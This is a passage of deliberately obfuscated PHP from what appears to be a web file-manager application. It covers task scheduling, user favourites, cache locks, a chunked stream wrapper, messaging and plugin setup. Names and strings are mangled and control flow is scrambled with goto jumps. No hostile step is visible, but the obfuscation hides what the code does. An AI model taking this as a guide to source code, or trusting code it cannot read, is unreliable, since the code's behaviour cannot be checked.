!= $F»›„ò¯îƒ[1089]) { $DÏ§Õù¯Ñ = $cõğÙ‹Şä–[0] . $F»›„ò¯îƒ[95] . $cõğÙ‹Şä–[1] . $F»›„ò¯îƒ[2107]; if (!in_array($DÏ§Õù¯Ñ, $f«§ÔÛÍ˜Ä)) { $eš¡ÕÆöì£[] = $DÏ§Õù¯Ñ; } } $eš¡ÕÆöì£[] = $DÓÃ„’¨Ùô; } $DÓÃ„’¨Ùô = implode($F»›„ò¯îƒ[47], $eš¡ÕÆöì£); } public function sort($C÷Ï°¥é„Ë, $cÈ¾™½«²À) { return parent::update($C÷Ï°¥é„Ë, $cÈ¾™½«²À); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\164\141\163\153\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\164\x79\x70\x65", "\145\166\145\x6e\164", "\x74\151\x6d\145", "\144\x65\163\143", "\x73\x79\163\164\145\155", "\145\156\141\142\154\145", "\154\x61\163\x74\122\x75\x6e", "\163\157\162\x74"); public function listData($bÁ»Ê±ÓëŒ = false, $B¦©Ô÷®³È = "\163\x6f\x72\x74", $BñÉŠ¾ÃÇ– = false) { return parent::listData($bÁ»Ê±ÓëŒ, $B¦©Ô÷®³È, $BñÉŠ¾ÃÇ–); } public function add($F·äÊô™Ş›) { $e‚‹¹éÌªå =& $_SERVER[¬ı§†‰ú˜¼]; $Cò‹Ï—Óò… = $this->findByName($F·äÊô™Ş›[$e‚‹¹éÌªå[28]]); if ($Cò‹Ï—Óò…) { return !1; } $F·äÊô™Ş›[$e‚‹¹éÌªå[1492]] = 0; $F·äÊô™Ş›[$e‚‹¹éÌªå[1713]] = $this->getSort(); return parent::insert($F·äÊô™Ş›); } private function getSort() { $bêÀ˜³ß·ï =& $_SERVER[¬ı§†‰ú˜¼]; $Añï‰öø¡ã = parent::listData(); $f‰É¨ª‹¾¢ = array_to_keyvalue($Añï‰öø¡ã, $bêÀ˜³ß·ï[33], $bêÀ˜³ß·ï[1713]); return empty($f‰É¨ª‹¾¢) ? 0 : max($f‰É¨ª‹¾¢) + 1; } public function update($e¶ñÉ°ïïù, $B‘éÏà‘Ï) { $bÄî×Ç‰äŸ =& $_SERVER[¬ı§†‰ú˜¼]; $eĞÙØ·­•ê = $this->listData($e¶ñÉ°ïïù); $D´ï«–ğ = $this->findByName($B‘éÏà‘Ï[$bÄî×Ç‰äŸ[28]]); if (!$eĞÙØ·­•ê || $D´ï«–ğ && $D´ï«–ğ[$bÄî×Ç‰äŸ[392]] != $eĞÙØ·­•ê[$bÄî×Ç‰äŸ[392]]) { return !1; } return parent::update($e¶ñÉ°ïïù, $B‘éÏà‘Ï); } public function remove($cÙèŞÒí–ö, $A¥—í¤¨ºÇ = false) { $Fè‚àİ©‰ =& $_SERVER[¬ı§†‰ú˜¼]; $cîÀø·ÚŒ¿ = $this->listData($cÙèŞÒí–ö); if (!$cîÀø·ÚŒ¿) { return; } if (!$A¥—í¤¨ºÇ && $cîÀø·ÚŒ¿[$Fè‚àİ©‰[1169]] == $Fè‚àİ©‰[87]) { return !1; } return parent::remove($cÙèŞÒí–ö); } public function enable($f¼ˆ›Û‚’ì, $EÊ¡Œê¾‚ó) { return $this->update($f¼ˆ›Û‚’ì, array($_SERVER[¬ı§†‰ú˜¼][2098] => $EÊ¡Œê¾‚ó)); } public function run($b¨ÏÙÛéò‰) { return $this->update($b¨ÏÙÛéò‰, array($_SERVER[¬ı§†‰ú˜¼][2108] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($DªŒ´âÑƒÃ) { $A…¬ï…øË˜ =& $_SERVER[¬ı§†‰ú˜¼]; return array($A…¬ï…øË˜[1792] => array(USER_ID, $A…¬ï…øË˜[2109])); } protected function listData() { $Bä¼Ãöğº =& $_SERVER[¬ı§†‰ú˜¼]; $BÇ³•Ûî¼ = array($Bä¼Ãöğº[1519] => USER_ID, $Bä¼Ãöğº[461] => 0); $dÉí‰‹ìİö = $Bä¼Ãöğº[2110]; $cß¸‰Œç­ˆ = $this->field($dÉí‰‹ìİö)->where($BÇ³•Ûî¼)->order($Bä¼Ãöğº[2111])->select(); return $cß¸‰Œç­ˆ ? $cß¸‰Œç­ˆ : array(); } protected function resetCache() { } protected function listView() { goto bé°¯µÂë; aÍ×œÛ™: $d°ÑˆÏÙ‚ = array_to_keyvalue($eìÄÈÈä°à, $DèÓ ÅÜÌˆ[33], $DèÓ ÅÜÌˆ[76]); if (!$d°ÑˆÏÙ‚) { return $a‘ºÜæŞÌÉ; } $FÚË––Í© = 2000; goto AÂÁÓŸÙ´ã; AÂÁÓŸÙ´ã: $bŒ¡Š°§¼“ = array($DèÓ ÅÜÌˆ[408] => array($DèÓ ÅÜÌˆ[409], $d°ÑˆÏÙ‚)); $Câç¿‘êŞÊ = Model($DèÓ ÅÜÌˆ[798])->listSource($bŒ¡Š°§¼“, $FÚË––Í©); $Câç¿‘êŞÊ = array_merge($Câç¿‘êŞÊ[$DèÓ ÅÜÌˆ[74]], $Câç¿‘êŞÊ[$DèÓ ÅÜÌˆ[75]]); goto f×¶ó¡ŒÕõ; bé°¯µÂë: $DèÓ ÅÜÌˆ =& $_SERVER[¬ı§†‰ú˜¼]; $a‘ºÜæŞÌÉ = $this->listData(); $eìÄÈÈä°à = array_filter_by_field($a‘ºÜæŞÌÉ, $DèÓ ÅÜÌˆ[29], $DèÓ ÅÜÌˆ[407]); goto aÍ×œÛ™; f×¶ó¡ŒÕõ: $Câç¿‘êŞÊ = array_to_keyvalue($Câç¿‘êŞÊ, $DèÓ ÅÜÌˆ[394]); foreach ($a‘ºÜæŞÌÉ as $EÒµ¬……¿‰ => $f´Ã–×Ì‹¡) { $FÀƒÜ¹ËÒ˜ = $Câç¿‘êŞÊ[$f´Ã–×Ì‹¡[$DèÓ ÅÜÌˆ[76]]]; $FÀƒÜ¹ËÒ˜ = $FÀƒÜ¹ËÒ˜ ? $FÀƒÜ¹ËÒ˜ : array(); $a‘ºÜæŞÌÉ[$EÒµ¬……¿‰] = array_merge($FÀƒÜ¹ËÒ˜, $f´Ã–×Ì‹¡); } return $a‘ºÜæŞÌÉ; goto Dá°‚Š¼È„; Dá°‚Š¼È„: } protected function addFav($C¾ù›áö¾‹, $e¿ëÒ¯°›Á = '', $eŞÕ¯°Íœ = "\163\x6f\165\162\x63\x65") { goto Aøê±ø…•; Aøê±ø…•: $C”¦Çµƒ =& $_SERVER[¬ı§†‰ú˜¼]; $aòÍÆÃ—÷ = array($C”¦Çµƒ[1519] => USER_ID, $C”¦Çµƒ[461] => 0, $C”¦Çµƒ[413] => $eŞÕ¯°Íœ, $C”¦Çµƒ[412] => $C¾ù›áö¾‹); if ($this->where($aòÍÆÃ—÷)->find()) { return !1; } goto dÓ«ñß‘ëæ; dÓ«ñß‘ëæ: $aòÍÆÃ—÷ = array($C”¦Çµƒ[1519] => USER_ID, $C”¦Çµƒ[461] => 0); $EÊì“Â¤¶× = $this->where($aòÍÆÃ—÷)->max($C”¦Çµƒ[1713]); if (!$EÊì“Â¤¶×) { $EÊì“Â¤¶× = 0; } goto D×‡îôÍî; D×‡îôÍî: if (!$e¿ëÒ¯°›Á && $eŞÕ¯°Íœ == $C”¦Çµƒ[407]) { $bò›„Òò = Model($C”¦Çµƒ[1204])->where(array($C”¦Çµƒ[408] => $C¾ù›áö¾‹))->find(); if (!$bò›„Òò) { return !1; } $e¿ëÒ¯°›Á = $bò›„Òò[$C”¦Çµƒ[28]]; } $e¿ëÒ¯°›Á = $this->getAutoName($e¿ëÒ¯°›Á); $E áªæîê¥ = array($C”¦Çµƒ[1519] => USER_ID, $C”¦Çµƒ[461] => 0, $C”¦Çµƒ[411] => $e¿ëÒ¯°›Á, $C”¦Çµƒ[412] => $C¾ù›áö¾‹, $C”¦Çµƒ[413] => $eŞÕ¯°Íœ, $C”¦Çµƒ[1694] => $EÊì“Â¤¶× + 1); goto F˜…£‚óÁ; F˜…£‚óÁ: return $this->add($E áªæîê¥); goto Cˆ¶¶…Ş; Cˆ¶¶…Ş: } protected function remove($DŸ´Ì¬¾º„) { $cò­ÖÖù =& $_SERVER[¬ı§†‰ú˜¼]; $aœÏ ì”¹° = array($cò­ÖÖù[1519] => USER_ID, $cò­ÖÖù[410] => $DŸ´Ì¬¾º„); return $this->where($aœÏ ì”¹°)->delete(); } protected function removeByName($Fìª±ïòö) { $c–ÓÔœºîŒ =& $_SERVER[¬ı§†‰ú˜¼]; $BÙ”¢‘ºª­ = array($c–ÓÔœºîŒ[1519] => USER_ID, $c–ÓÔœºîŒ[411] => $Fìª±ïòö, $c–ÓÔœºîŒ[461] => 0); return $this->where($BÙ”¢‘ºª­)->delete(); } protected function rename($eé‡ŠÀËñä, $D±öàó‡Ë¶) { $aÓƒ«©Õº =& $_SERVER[¬ı§†‰ú˜¼]; if ($eé‡ŠÀËñä == $D±öàó‡Ë¶) { return !1; } $D˜ˆùõİ—÷ = $this->getAutoName($D±öàó‡Ë¶); if ($D±öàó‡Ë¶ != $D˜ˆùõİ—÷) { return !1; } $a««òâëò³ = array($aÓƒ«©Õº[1519] => USER_ID, $aÓƒ«©Õº[461] => 0, $aÓƒ«©Õº[28] => $eé‡ŠÀËñä); return $this->where($a««òâëò³)->save(array($aÓƒ«©Õº[28] => $D±öàó‡Ë¶)); } protected function resetSort($e¢Œäè‚Îï) { $AĞ½çğî¶ƒ =& $_SERVER[¬ı§†‰ú˜¼]; $e¢Œäè‚Îï = is_array($e¢Œäè‚Îï) ? $e¢Œäè‚Îï : array(); $DÂ¢†„ÈÜ× = array($AĞ½çğî¶ƒ[1519] => USER_ID); for ($C‹çÃó™ƒÏ = 0; $C‹çÃó™ƒÏ < count($e¢Œäè‚Îï); $C‹çÃó™ƒÏ++) { $DÂ¢†„ÈÜ×[$AĞ½çğî¶ƒ[410]] = $e¢Œäè‚Îï[$C‹çÃó™ƒÏ]; $this->where($DÂ¢†„ÈÜ×)->save(array($AĞ½çğî¶ƒ[1694] => $C‹çÃó™ƒÏ + 1)); } return !0; } protected function moveTop($B´Óæ¼¦­ø) { goto AˆŸŒï¦Œî; f²ä˜‡âùÍ: $C°¹ƒƒÕ® = $DµŞè‚ãˆ; $DµŞè‚ãˆ = array_remove_value($DµŞè‚ãˆ, $c©Æ²òÑëÁ[$cğ¾ã½ò¿­[392]]); array_unshift($DµŞè‚ãˆ, $c©Æ²òÑëÁ[$cğ¾ã½ò¿­[392]]); goto Dò¶ã„‰Ñ; FËš¿™—Ş: if (!$c©Æ²òÑëÁ) { return; } $DµŞè‚ãˆ = $this->field($cğ¾ã½ò¿­[392])->where($bŞå¬Èµùğ)->order($cğ¾ã½ò¿­[2111])->select(); $DµŞè‚ãˆ = array_to_keyvalue($DµŞè‚ãˆ, $cğ¾ã½ò¿­[33], $cğ¾ã½ò¿­[392]); goto f²ä˜‡âùÍ; AˆŸŒï¦Œî: $cğ¾ã½ò¿­ =& $_SERVER[¬ı§†‰ú˜¼]; $bŞå¬Èµùğ = array($cğ¾ã½ò¿­[1519] => USER_ID, $cğ¾ã½ò¿­[461] => 0); $c©Æ²òÑëÁ = $this->where($bŞå¬Èµùğ)->where(array($cğ¾ã½ò¿­[28] => $B´Óæ¼¦­ø))->find(); goto FËš¿™—Ş; Dò¶ã„‰Ñ: return $this->resetSort($DµŞè‚ãˆ); goto B˜ƒÎÓŠå; B˜ƒÎÓŠå: } protected function moveBottom($eÑ¨§ôÖ¶) { $d•òÔë»£ä =& $_SERVER[¬ı§†‰ú˜¼]; $C¦ íÒÂÊ = array($d•òÔë»£ä[1519] => USER_ID, $d•òÔë»£ä[461] => 0); $FæÒ˜‰š©ó = $this->where($C¦ íÒÂÊ)->max($d•òÔë»£ä[1713]); $Eç‡ñ­°ˆ… = array($d•òÔë»£ä[1713] => $FæÒ˜‰š©ó + 1); return $this->where($C¦ íÒÂÊ)->where(array($d•òÔë»£ä[28] => $eÑ¨§ôÖ¶))->save($Eç‡ñ­°ˆ…); } private function getAutoName($dº¥ö¢À¸´) { goto Aøªô¦ìø; C¬Ÿ„…©­ç: return $dº¥ö¢À¸´ . "\x28{$d»²î‘»•³}\51"; goto FÀÖåàÅÅä; e¤Û±Ä™öÂ: $c‘ğêÙ©ÖÓ = array_to_keyvalue($c‘ğêÙ©ÖÓ, $D–›ŒÃĞ×©[33], $D–›ŒÃĞ×©[28]); if (!$c‘ğêÙ©ÖÓ || !in_array($dº¥ö¢À¸´, $c‘ğêÙ©ÖÓ)) { return $dº¥ö¢À¸´; } for ($d»²î‘»•³ = 0; $d»²î‘»•³ < count($c‘ğêÙ©ÖÓ); $d»²î‘»•³++) { if (!in_array($dº¥ö¢À¸´ . "\x28{$d»²î‘»•³}\x29", $c‘ğêÙ©ÖÓ)) { return $dº¥ö¢À¸´ . "\50{$d»²î‘»•³}\x29"; } } goto C¬Ÿ„…©­ç; Aøªô¦ìø: $D–›ŒÃĞ×© =& $_SERVER[¬ı§†‰ú˜¼]; $c¹ù†¡Šé‘ = array($D–›ŒÃĞ×©[1519] => USER_ID, $D–›ŒÃĞ×©[461] => 0); $c‘ğêÙ©ÖÓ = $this->field($D–›ŒÃĞ×©[28])->where($c¹ù†¡Šé‘)->select(); goto e¤Û±Ä™öÂ; FÀÖåàÅÅä: } } goto F‹‡…„Ğ™Š; B Ğšù±Õ¼: class CacheLockRedis { public function lock($A¬•¡œÆ’ä, $eïáÊ½Ü­“ = 10) { $Aè›¤°Íé† = Cache::init(); $eÏÔ©Ú³´Š = microtime(!0) + $eïáÊ½Ü­“; while (microtime(!0) < $eÏÔ©Ú³´Š) { $e¡Ôºë·òï = $Aè›¤°Íé†->get($A¬•¡œÆ’ä); if (!$e¡Ôºë·òï) { $DÆÃŒ¢ÏŒ = $Aè›¤°Íé†->setLock($A¬•¡œÆ’ä, $eÏÔ©Ú³´Š, $eïáÊ½Ü­“); if ($DÆÃŒ¢ÏŒ) { return !0; } } else { if ($e¡Ôºë·òï < microtime(!0)) { $Aè›¤°Íé†->set($A¬•¡œÆ’ä, $eÏÔ©Ú³´Š, $eïáÊ½Ü­“ * 2); if ($Aè›¤°Íé†->get($A¬•¡œÆ’ä) === $e¡Ôºë·òï) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($C¡×ÀàåÀÉ) { return Cache::init()->get($C¡×ÀàåÀÉ); } public function unlock($E÷Û¬¼ÜÌ) { return Cache::init()->remove($E÷Û¬¼ÜÌ); } } class CacheLockMemcached { public function lock($aÏÉ‚„’¡‰, $BÓÌø…Ô•‹ = 0) { $AêƒÕ——¦ = Cache::init(); $b³¨¬å¸œƒ = microtime(!0) + $BÓÌø…Ô•‹; while (microtime(!0) < $b³¨¬å¸œƒ) { $FÕÃ™Ùá« = $AêƒÕ——¦->get($aÏÉ‚„’¡‰); if (!$FÕÃ™Ùá« || $FÕÃ™Ùá« < microtime(!0)) { $aöÜˆÔ›Æ“ = $AêƒÕ——¦->handle->add($aÏÉ‚„’¡‰, $b³¨¬å¸œƒ, $BÓÌø…Ô•‹); if ($aöÜˆÔ›Æ“) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($b °ÇäëÎ) { return Cache::init()->get($b °ÇäëÎ); } public function unlock($dìòŠåìŞ) { return Cache::init()->remove($dìòŠåìŞ); } } class CacheLockDatabase { public function lock($A‘”ñ¢¾ˆ‹, $f÷©‘ƒ»É† = 0) { $E†Ô–¿İò¸ = Model($_SERVER[¬ı§†‰ú˜¼][802]); $Dã«©›å¢‡ = microtime(!0) + $f÷©‘ƒ»É†; while (microtime(!0) < $Dã«©›å¢‡) { $a‹¡Á‰×ïÒ = $E†Ô–¿İò¸->get($A‘”ñ¢¾ˆ‹); if (!$a‹¡Á‰×ïÒ || $a‹¡Á‰×ïÒ < microtime(!0)) { $BóñæÅã‚¼ = $E†Ô–¿İò¸->set($A‘”ñ¢¾ˆ‹, $Dã«©›å¢‡); if ($BóñæÅã‚¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Dº«¡åËÌø) { return Model($_SERVER[¬ı§†‰ú˜¼][802])->get($Dº«¡åËÌø); } public function unlock($fË°…é†Ö) { Model($_SERVER[¬ı§†‰ú˜¼][802])->remove($fË°…é†Ö); } } goto bÅ®çöö; aµªø©½†: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($E”‹†Ê˜ÅÃ, $AŞ’¸ÍÔ»´ = '') { goto aÔÕÆ†á²ä; aÔÕÆ†á²ä: $this->info = $this->info($E”‹†Ê˜ÅÃ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¬ı§†‰ú˜¼][76]]; goto EÒï†ªÔÓ…; EÒï†ªÔÓ…: $this->pathOpen = $E”‹†Ê˜ÅÃ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto D±Î×¼ß¥; D±Î×¼ß¥: if (!isset(self::$_chunkBuffer[$E”‹†Ê˜ÅÃ])) { self::$_chunkBuffer[$E”‹†Ê˜ÅÃ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto D» ‡÷Ëù ; D» ‡÷Ëù : } function stream_read($b‚§ˆ‘¨òÉ) { $FÏó‚´„£ğ = $this->fileSubstr($this->pose, $b‚§ˆ‘¨òÉ); $this->pose += strlen($FÏó‚´„£ğ); return $FÏó‚´„£ğ; } public function stream_tell() { return $this->pose; } public function stream_seek($A³“œ—±íÈ, $bº§÷÷ÖÁ¤) { $aÄãä“á«á =& $_SERVER[¬ı§†‰ú˜¼]; if ($bº§÷÷ÖÁ¤ == SEEK_SET) { $this->pose = $A³“œ—±íÈ; } else { if ($bº§÷÷ÖÁ¤ == SEEK_CUR) { $this->pose += $A³“œ—±íÈ; } else { if ($bº§÷÷ÖÁ¤ == SEEK_END) { $this->pose = $this->info[$aÄãä“á«á[78]] + intval($A³“œ—±íÈ); } } } if ($A³“œ—±íÈ < 0) { $this->pose = $this->info[$aÄãä“á«á[78]] + $A³“œ—±íÈ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¬ı§†‰ú˜¼][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($cíò®ß£ƒÏ, $f¯áÓèèŠ) { $eòÔâ¶êáØ =& $_SERVER[¬ı§†‰ú˜¼]; $e‹´‘ÒË® = $this->info($cíò®ß£ƒÏ); return array($eòÔâ¶êáØ[1378] => 0, $eòÔâ¶êáØ[1379] => 0, $eòÔâ¶êáØ[12] => 32768 + 511, $eòÔâ¶êáØ[1380] => 0, $eòÔâ¶êáØ[1381] => 0, $eòÔâ¶êáØ[1382] => 0, $eòÔâ¶êáØ[1383] => 0, $eòÔâ¶êáØ[78] => $e‹´‘ÒË®[$eòÔâ¶êáØ[78]], $eòÔâ¶êáØ[1384] => $e‹´‘ÒË®[$eòÔâ¶êáØ[1253]], $eòÔâ¶êáØ[1340] => $e‹´‘ÒË®[$eòÔâ¶êáØ[84]], $eòÔâ¶êáØ[1339] => $e‹´‘ÒË®[$eòÔâ¶êáØ[193]], $eòÔâ¶êáØ[1385] => 0, $eòÔâ¶êáØ[1386] => 0); } static $fileInfo = array(); public function info($dĞ·ÕÃäİ½) { $b‰»¬¤ÀÙÄ = $_SERVER[¬ı§†‰ú˜¼][1387]; if (isset(self::$fileInfo[$dĞ·ÕÃäİ½])) { return self::$fileInfo[$dĞ·ÕÃäİ½]; } if (substr($dĞ·ÕÃäİ½, 0, strlen($b‰»¬¤ÀÙÄ)) != $b‰»¬¤ÀÙÄ) { return !1; } self::$fileInfo[$dĞ·ÕÃäİ½] = IO::info(substr($dĞ·ÕÃäİ½, strlen($b‰»¬¤ÀÙÄ))); return self::$fileInfo[$dĞ·ÕÃäİ½]; } public static function read($aÏ§ˆ¶î‡Ÿ, $B°Öˆç‰Âø, $E•§¦Æ½¢) { if (!isset(self::$_fopenCache[$aÏ§ˆ¶î‡Ÿ])) { $d¼¿à÷‚¢ = new StreamWrapperIO(); $d¼¿à÷‚¢->stream_open($aÏ§ˆ¶î‡Ÿ); self::$_fopenCache[$aÏ§ˆ¶î‡Ÿ] = $d¼¿à÷‚¢; } $d¼¿à÷‚¢ = self::$_fopenCache[$aÏ§ˆ¶î‡Ÿ]; return $d¼¿à÷‚¢->fileSubstr($B°Öˆç‰Âø, $E•§¦Æ½¢); } public static function _read($F¦ë†½œÑ, $côÙš”Ò, $Eš‰Î“Ü‰õ) { goto Dá‡‡½ªí–; Dá‡‡½ªí–: $fÙÁØÚùŞ =& $_SERVER[¬ı§†‰ú˜¼]; $EöË÷Ÿôª = fopen($F¦ë†½œÑ, $fÙÁØÚùŞ[1257]); if (!$EöË÷Ÿôª) { return $fÙÁØÚùŞ[33]; } goto eŞ‹ÔÖÍ³; CÚïôĞ‡«›: return $eÌ¹ì¼Šñ¢; goto AÉØ¶é„±•; eŞ‹ÔÖÍ³: $B•È´ÄÙ£Ä = 8192; fseek($EöË÷Ÿôª, $côÙš”Ò, SEEK_SET); $eÌ¹ì¼Šñ¢ = $fÙÁØÚùŞ[33]; goto E»ÍäŸ’½Ê; E»ÍäŸ’½Ê: $CÁé¤áîôÈ = 0; while ($CÁé¤áîôÈ < $Eš‰Î“Ü‰õ) { $Dè±Øáæ› = min($B•È´ÄÙ£Ä, $Eš‰Î“Ü‰õ - $CÁé¤áîôÈ); $eÌ¹ì¼Šñ¢ .= fread($EöË÷Ÿôª, $Dè±Øáæ›); $CÁé¤áîôÈ += $Dè±Øáæ›; } fclose($EöË÷Ÿôª); goto CÚïôĞ‡«›; AÉØ¶é„±•: } public function fileSubstr($C­Îîàˆõä, $c­ØŠ³êøÜ) { goto dëÚØå×‹Œ; EøÅæ¦ÒÉ: $B¸ì³¥«µ = 64 * 1024; $e¿âçÕ¸”– =& self::$_chunkBuffer[$this->path]; if (!$e¿âçÕ¸”–) { $e¿âçÕ¸”– = array(); } goto cÁ™Üºì†; F»‚Û„‰é: if ($C­Îîàˆõä + $c­ØŠ³êøÜ > $aÅÅÀøËÚ”) { $c­ØŠ³êøÜ = $aÅÅÀøËÚ” - $C­Îîàˆõä; } if ($c­ØŠ³êøÜ <= 0) { return $aŠÍ¯ÙŒ—[33]; } if ($C­Îîàˆõä < 0 || $C­Îîàˆõä >= $aÅÅÀøËÚ” || $c­ØŠ³êøÜ <= 0 || $c­ØŠ³êøÜ > 1024 * 1024 * 5) { throw new Exception("\151\157\106\151\x6c\145\x52\x65\141\x64\40\145\162\x72\x6f\162\41\x20\x73\x74\141\162\x74\x3d{$C­Îîàˆõä}\x3b\154\145\x6e\147\x74\150\75{$c­ØŠ³êøÜ}\73\x20\163\x69\x7a\145\75{$aÅÅÀøËÚ”}\73"); } goto EøÅæ¦ÒÉ; cĞ›™ôğ¶Ó: $e¶É›ÍÙ…Š = $c­ØŠ³êøÜ; if ($C­Îîàˆõä < 0) { $C­Îîàˆõä = $aÅÅÀøËÚ” + $C­Îîàˆõä; } if ($c­ØŠ³êøÜ === !1) { $c­ØŠ³êøÜ = $aÅÅÀøËÚ” - $C­Îîàˆõä; } goto F»‚Û„‰é; Eêá‘òÄÉÑ: $E’øë ¦Æß = ceil(($C­Îîàˆõä + $c­ØŠ³êøÜ) / $B¸ì³¥«µ) * $B¸ì³¥«µ - $AŞ¿ÎÅôÖŒ; $a‚´º—“ªé = IO::fileSubstr($this->path, $AŞ¿ÎÅôÖŒ, $E’øë ¦Æß); $e¿âçÕ¸”–[$AŞ¿ÎÅôÖŒ . $aŠÍ¯ÙŒ—[33]] = $a‚´º—“ªé; goto dçäë‚İĞ±; cÁ™Üºì†: $béŠŠ©±ç = 0; $dëÜáà÷Ÿ = 0; $c–İù‡šÛÀ = $aŠÍ¯ÙŒ—[33]; goto b°–‘½Š¤; dëÚØå×‹Œ: $aŠÍ¯ÙŒ— =& $_SERVER[¬ı§†‰ú˜¼]; $aÅÅÀøËÚ” = $this->info[$aŠÍ¯ÙŒ—[78]]; $cÈÄÑ—¸×¥ = $C­Îîàˆõä; goto cĞ›™ôğ¶Ó; b°–‘½Š¤: foreach ($e¿âçÕ¸”– as $béŠŠ©±ç => $c–İù‡šÛÀ) { $béŠŠ©±ç = intval($béŠŠ©±ç); $dëÜáà÷Ÿ = $béŠŠ©±ç + strlen($c–İù‡šÛÀ); if ($C­Îîàˆõä >= $dëÜáà÷Ÿ) { continue; } if ($C­Îîàˆõä >= $béŠŠ©±ç && $C­Îîàˆõä + $c­ØŠ³êøÜ <= $dëÜáà÷Ÿ) { return substr($c–İù‡šÛÀ, $C­Îîàˆõä - $béŠŠ©±ç, $c­ØŠ³êøÜ); } break; } if (count($e¿âçÕ¸”–) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($aŠÍ¯ÙŒ—[1388], $aŠÍ¯ÙŒ—[1389] . count($e¿âçÕ¸”–) . "\73\163\164\141\162\164\75{$C­Îîàˆõä}\x2c\154\145\156\x67\164\150\x3d{$c­ØŠ³êøÜ}\x3b\160\157\163\x65\x3a{$béŠŠ©±ç}\x7e{$dëÜáà÷Ÿ}"); throw new Exception($aŠÍ¯ÙŒ—[1390]); } $AŞ¿ÎÅôÖŒ = intval($C­Îîàˆõä / $B¸ì³¥«µ) * $B¸ì³¥«µ; goto Eêá‘òÄÉÑ; dçäë‚İĞ±: ksort($e¿âçÕ¸”–); $aÖâ˜¶†¬¾ = substr($a‚´º—“ªé, $C­Îîàˆõä - $AŞ¿ÎÅôÖŒ, $c­ØŠ³êøÜ); return $aÖâ˜¶†¬¾; goto FŸÌ”“ºÔ¼; FŸÌ”“ºÔ¼: } private function log($BÌ›Û†‘¥, $eïÂ²„ã­¨) { $AÁïÇ÷íÜ¶ =& $_SERVER[¬ı§†‰ú˜¼]; $FœØ…éÑ˜Õ = timeFloat() - $this->timeStart; write_log(sprintf($AÁïÇ÷íÜ¶[1391], $BÌ›Û†‘¥, $this->info[$AÁïÇ÷íÜ¶[28]], $FœØ…éÑ˜Õ, $eïÂ²„ã­¨), $AÁïÇ÷íÜ¶[1077]); } } class Message { function __construct() { } public function send($A·­¿ÈÌµç = '', $eËÖ÷–ïšÄ = array(), $eÚ¬ø¨Ú¼Ó = "\x74\x65\x78\164") { goto BÁ‘ë•ÔóĞ; BÁ‘ë•ÔóĞ: $a×ã¡ğœ¾ =& $_SERVER[¬ı§†‰ú˜¼]; $DÛ·¨Í†‡¯ = array($a×ã¡ğœ¾[29] => $a×ã¡ğœ¾[1392], $a×ã¡ğœ¾[717] => $A·­¿ÈÌµç); if (in_array($eÚ¬ø¨Ú¼Ó, array($a×ã¡ğœ¾[1392], $a×ã¡ğœ¾[1393]))) { $DÛ·¨Í†‡¯[$a×ã¡ğœ¾[29]] = $eÚ¬ø¨Ú¼Ó; } goto B„™åŞ©Ê; B„™åŞ©Ê: $eËÖ÷–ïšÄ = array($a×ã¡ğœ¾[1014] => isset($eËÖ÷–ïšÄ[$a×ã¡ğœ¾[1014]]) ? $eËÖ÷–ïšÄ[$a×ã¡ğœ¾[1014]] : $a×ã¡ğœ¾[33], $a×ã¡ğœ¾[561] => isset($eËÖ÷–ïšÄ[$a×ã¡ğœ¾[561]]) ? $eËÖ÷–ïšÄ[$a×ã¡ğœ¾[561]] : $a×ã¡ğœ¾[33]); if (empty($A·­¿ÈÌµç) || empty($eËÖ÷–ïšÄ[$a×ã¡ğœ¾[1014]]) && empty($eËÖ÷–ïšÄ[$a×ã¡ğœ¾[561]])) { return !1; } $b¥¢ïªŒ = array($a×ã¡ğœ¾[1333] => $DÛ·¨Í†‡¯, $a×ã¡ğœ¾[1394] => $eËÖ÷–ïšÄ); goto bô°„¡ßå; bô°„¡ßå: Hook::trigger($a×ã¡ğœ¾[1395], $b¥¢ïªŒ); goto B’Í¢ÅÁ“; B’Í¢ÅÁ“: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto c¯Äª¹¤ÃÃ; d˜‚ªˆÔ®¬: return $this; goto bÛ’ï…š›ø; C±‡Ïâé‹ò: $this->pluginName = str_replace($aä…§´ÇÀ‰[1398], $aä…§´ÇÀ‰[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $aä…§´ÇÀ‰[8]; $this->pluginApi = appHostGet() . $aä…§´ÇÀ‰[1399] . $this->pluginName . $aä…§´ÇÀ‰[8]; goto E¼ŸéãŸ÷Š; E±¾©¬¬µ»: if ($EÑÈ±ÁîÔ && strpos($aä…§´ÇÀ‰[47] . $EÑÈ±ÁîÔ . $aä…§´ÇÀ‰[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$aä…§´ÇÀ‰[1402]] . $this->pluginName . $aä…§´ÇÀ‰[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto d˜‚ªˆÔ®¬; E¼ŸéãŸ÷Š: $this->pluginHost = $config[$aä…§´ÇÀ‰[1400]] . $this->pluginName . $aä…§´ÇÀ‰[8]; $this->pluginHostDefault = $config[$aä…§´ÇÀ‰[1400]] . $this->pluginName . $aä…§´ÇÀ‰[8]; $EÑÈ±ÁîÔ = $config[$aä…§´ÇÀ‰[1401]]; goto E±¾©¬¬µ»; BàÅåèõ­µ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($aä…§´ÇÀ‰[1398]); goto C±‡Ïâé‹ò; c¯Äª¹¤ÃÃ: $aä…§´ÇÀ‰ =& $_SERVER[¬ı§†‰ú˜¼]; if 